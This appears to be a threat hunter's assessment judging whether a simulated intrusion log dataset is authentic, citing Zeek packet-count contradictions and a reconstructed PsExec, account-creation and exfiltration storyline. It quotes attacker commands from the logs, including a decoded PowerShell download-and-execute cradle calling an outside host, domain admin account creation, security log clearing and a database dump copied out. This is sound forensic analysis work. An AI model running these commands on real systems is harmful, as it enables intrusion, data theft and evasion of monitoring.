# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic  
**Confidence:** 86

## Executive Summary

The dataset is high quality and follows a coherent intrusion storyline, but the Zeek TCP accounting contains source-native packet/byte contradictions that I would not expect from real packet-derived telemetry. The strongest tell is multi-hundred-megabyte TCP transfers with only 4-9 packets recorded in the ACK direction, which is not plausible for real Zeek `conn.log` packet counters.

## Evidence For Synthetic

- `zeek-dmz/conn.json:5790` records `10.10.3.20:58187 -> 45.33.32.30:443` with `orig_bytes=315397954`, `orig_pkts=216026`, but only `resp_pkts=9`. A real TCP receiver would generate thousands of ACK packets for a 315 MB upload.
- `zeek-dmz/conn.json:5789` records the proxy leg `10.10.1.35:52332 -> 10.10.3.20:8080` with `orig_bytes=314783347`, `orig_pkts=215607`, but `resp_pkts=4`, again impossible for real TCP accounting.
- `zeek-core/conn.json:4121` records an SMB transfer from `10.10.2.20:445 -> 10.10.1.35:61680` with `resp_bytes=313934166`, `resp_pkts=215024`, but only `orig_pkts=64`; the client ACK side is far too small.
- Interactive bash histories are unusually smoothed. Across active histories such as `PROXY-01/.../marcus.chen.bash_history` and `APP-INT-01/.../aisha.johnson.bash_history`, command gaps have minimums around 6-8 seconds and medians around 69-85 seconds, with no natural rapid-fire command bursts.
- The PsExec activity is strong on the target DC, but I did not find a corresponding PsExec client process on `WS-AJOHNSON-01` despite visible source SMB traffic at `2024-03-18T15:59:58Z` and rich Sysmon/eCAR around that period. This is not impossible, but it feels like a rendered target-side narrative with weaker source-side artifacting.
- The attack chain is tactically coherent but very staged: account creation, privilege add, file compression, large proxy upload, encoded PowerShell, `wevtutil cl Security`, and account deletion occur in a clean sequence with few operator mistakes.

## Evidence For Real

- The intrusion storyline is plausible: PsExec to DC, domain account creation, Domain Admins membership, persistence via service/scheduled task, file archive on `FILE-SRV-01`, proxy-mediated exfiltration, and cleanup.
- Cross-source pivots are mostly excellent. Example: `DC-01` Security 4688/Sysmon/eCAR all show `net user svc_mhsync MhsSvc!2024 /add /domain` around `2024-03-18T16:15:16Z`.
- Windows Security behavior around `wevtutil cl Security` is convincing: the DC Security log shows EventRecordID reset after Event ID `1102` at `2024-03-18T17:42:15Z`.
- Baseline noise includes realistic enterprise artifacts: Kerberos 4768/4769 churn on the DC, DHCP renewals, service-account activity, anonymous logons, Zscaler/AnyConnect/Slack/Dropbox processes, Linux admin shell activity, OCSP/X.509/TLS metadata, and failed logons.
- The attack has believable dead ends and variants: direct IP proxy `CONNECT` attempts to `45.33.32.30` return 403 while hostname-based `api.westbridge-services.net` succeeds.

## Detailed Analysis

**Environment Orientation**

The logs cover `2024-03-18T12:00:02Z` through `2024-03-18T20:15:23Z`, roughly a US Eastern workday slice. I saw Windows Security/Sysmon/eCAR on domain hosts, Linux eCAR plus bash history on servers/workstations, and Zeek core/DMZ `conn`, `dns`, `http`, `ssl`, `files`, `x509`, `ocsp`, and `dhcp`.

The apparent host map includes `DC-01=10.10.2.10`, `FILE-SRV-01=10.10.2.20`, `APP-INT-01=10.10.2.30`, `PROXY-01=10.10.3.20`, `WEB-EXT-01=10.10.3.10`, `DB-PROD-01=10.10.4.10`, and several `10.10.1.x` workstations.

**Attack Storyline**

The main Windows chain appears to begin from `WS-AJOHNSON-01` / `10.10.1.35`. At `2024-03-18T15:59:57Z`, `DC-01` logs a type 3 logon for `aisha.johnson` from `10.10.1.35`; at `15:59:59Z`, service `PSEXESVC` is created; at `16:00:03Z`, `cmd.exe /c whoami && hostname` runs under `C:\Windows\PSEXESVC.exe`.

At `16:15:16Z`, `DC-01` runs `net user svc_mhsync MhsSvc!2024 /add /domain`; at `16:15:20Z`, it runs `net group "Domain Admins" svc_mhsync /add /domain`. The corresponding account management events are present: 4720 at `16:15:18Z` and 4728 at `16:15:21Z`.

At `17:00:34Z`, `FILE-SRV-01` runs PowerShell as `svc_mhsync` to compress `\\FILE-SRV-01\Finance\Q1\*` and `\\FILE-SRV-01\Patients\Exports\*` into `C:\ProgramData\Microsoft\cache_7f3a.zip`. At `17:23:07Z`, Zeek shows an SMB transfer from `FILE-SRV-01` to `WS-AJOHNSON-01`; at `17:24:35Z`, Chrome on `WS-AJOHNSON-01` opens a proxy CONNECT to `api.westbridge-services.net`; at `17:24:36Z`, the proxy opens TLS to `45.33.32.30`.

At `17:42:02Z`, `DC-01` executes encoded PowerShell from `PSEXESVC`. Decoded, it is `IEX (New-Object Net.WebClient).DownloadString("https://api.westbridge-services.net/v2/manifest")`. One second later, `wevtutil cl Security` runs, followed by Security Event ID 1102. At `17:50:09Z`, `net user svc_mhsync /delete /domain` runs.

**Protocol Accounting Issue**

The main reason I judge this synthetic is the Zeek packet accounting. Multi-hundred-megabyte TCP transfers cannot have only 4 or 9 packets in the opposite direction, because ACKs are packets even when they carry no payload. The affected rows are not merely "complete" or "too correlated"; they are source-native flow counter contradictions.

This issue appears on both the internal and DMZ legs of the same exfil path, which suggests a generator-level transfer model that scales byte counts but not reverse-direction packet counts.

**Linux/Database Activity**

There is a second suspicious Linux path on `DB-PROD-01`: root runs `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`, then `gzip`, then `scp` to `root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz` at `17:20:15Z`. eCAR and Zeek line up well with the SSH flow from `10.10.4.10` to `10.10.2.30`.

That path is realistic at a storyline level, but the shell-history timing across the corpus is too evenly paced for live operators.

## Realism Score by Category

- **Field format accuracy:** 8 — Windows, Sysmon, eCAR, Zeek fields are mostly convincing, but Zeek packet counters break realism.
- **Temporal patterns:** 7 — Workday timing and attack sequence are good; shell histories and some staged actions feel smoothed.
- **Cross-source correlation:** 9 — Pivots across Windows, eCAR, Zeek, proxy, DNS, and TLS are strong.
- **Behavioral realism:** 8 — Tradecraft is plausible and huntable, with some operator cleanup and failed attempts.
- **Environmental consistency:** 8 — Host roles, IP segments, service noise, and enterprise tooling are coherent.

## Recommendations

If this were synthetic, I would improve TCP flow generation first: calculate packet counts and ACK-side packet volumes consistently with byte volume, MTU/MSS assumptions, delayed ACK behavior, duration, and connection history.

I would also add more natural interactive timing to bash histories and source-side operator artifacts for remote execution, especially the initiating PsExec client process and tool staging on the source workstation.
